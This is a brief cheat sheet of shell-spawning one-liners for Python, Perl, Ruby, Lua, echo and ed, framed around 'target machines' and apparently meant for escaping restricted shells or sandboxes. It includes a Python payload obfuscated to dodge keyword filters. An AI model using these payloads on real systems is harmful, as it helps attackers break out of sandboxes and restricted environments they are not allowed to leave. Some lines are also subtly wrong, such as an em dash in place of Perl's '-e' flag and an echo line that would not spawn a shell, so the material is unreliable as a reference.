- - -
### Python : 

```python
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('/bin/bash')
```

### Echo : 

```sh
echo os.system('/bin/bash')
```

### Perl : 

```perl
perl —e 'exec "/bin/sh";'
exec "/bin/sh";    
```

### Ruby : 

```ruby
exec "/bin/sh" 
```

### LUA : 

```lua
os.execute('/bin/sh') 
```

#### Is ed present on the target machines? 

```sh
ed
!sh
```

- - -
